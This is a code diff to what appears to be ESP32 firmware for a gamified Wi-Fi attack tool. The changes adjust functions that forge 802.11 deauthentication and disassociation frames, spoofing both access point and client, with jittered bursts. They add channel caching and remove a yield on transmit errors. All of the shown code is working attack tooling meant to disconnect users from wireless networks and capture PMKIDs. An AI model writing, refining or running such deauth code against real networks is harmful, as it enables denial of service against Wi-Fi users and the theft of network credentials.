@@ -2413,6 +2413,13 @@ bool OinkMode::saveAllPMKIDs() {
 }
 
 void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
+    // Only set channel if it actually changed — avoids flushing TX queues on ESP32-S3
+    static uint8_t lastTxChannel = 0;
+    if (currentChannel != lastTxChannel) {
+        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+        lastTxChannel = currentChannel;
+    }
+
     uint8_t deauthPacket[26] = {
         0xC0, 0x00, 0x00, 0x00,
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
@@ -2453,18 +2460,18 @@ void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uin
     // Jitter is modified by buffs/debuffs (base 5ms, debuffed 7ms)
     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     uint8_t jitterMax = SwineStats::getDeauthJitterMax();
-
+    
     // Mark session as having deauthed (for Silent Witness achievement tracking)
     SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
     sess.everDeauthed = true;
-
+    
     for (uint8_t i = 0; i < count; i++) {
         // AP -> Client (pretend to be AP)
         sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
-
+        
         // Random jitter 1-Nms between forward and reverse frames (buff-modified)
         delay(random(1, jitterMax + 1));
-
+        
         // Client -> AP (pretend to be client) - bidirectional attack
         if (memcmp(station, broadcast, 6) != 0) {
             // Only if not broadcast - swap source/dest
@@ -2483,7 +2490,7 @@ void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uin
             if (rev_err != ESP_OK) {
                 deauthTxErrors++;
             }
-
+            
             // Jitter between iterations (buff-modified)
             // CRITICAL FIX: Use yield() on longer jitters to prevent WDT reset
             uint32_t jitterMs = random(1, jitterMax + 1);
@@ -2495,7 +2502,7 @@ void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uin
                 delay(jitterMs);
             }
         }
-
+        
         // Yield every 4 frames to feed watchdog during large bursts
         if ((i & 0x03) == 0x03) {
             yield();
@@ -2522,9 +2529,6 @@ void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, u
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
     if (err != ESP_OK) {
         deauthTxErrors++;
-        if (err == 257) {
-            yield();
-        }
     }
 }
 
